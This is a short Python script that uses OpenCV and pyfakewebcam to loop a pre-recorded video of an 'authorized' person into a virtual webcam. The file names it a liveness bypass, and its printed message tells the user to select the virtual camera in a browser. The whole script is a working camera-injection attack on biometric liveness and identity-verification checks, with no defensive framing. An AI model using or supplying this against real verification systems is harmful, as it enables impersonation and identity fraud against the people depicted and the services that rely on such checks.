import cv2
import numpy as np
import pyfakewebcam

# 1. Define the dimensions (must match what the browser expects)
width, height = 640, 480

# 2. Connect to the Virtual Device 
# On Linux, this is usually /dev/video1 if video0 is your real webcam
# On Windows, you would use a specific OBS/Unity pipe
fake_cam = pyfakewebcam.FakeWebcam('/dev/video1', width, height)

# 3. Load the pre-recorded video of the "authorized" person
cap = cv2.VideoCapture('recorded_liveness_bypass.mp4')

print("Injection started. Open your browser and select 'Virtual Camera'...")

while True:
    ret, frame = cap.read()
    
    # If the video ends, loop it back to the start
    if not ret:
        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
        continue

    # 4. Pre-processing
    # Match the frame size to the virtual camera requirements
    frame = cv2.resize(frame, (width, height))
    
    # Convert BGR (OpenCV default) to RGB (Webcam standard)
    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    # 5. Inject the frame into the system's video stream
    fake_cam.schedule_frame(frame_rgb)

    # Small delay to maintain 30FPS (1000ms / 30 approx 33ms)
    if cv2.waitKey(33) & 0xFF == ord('q'):
        break

cap.release()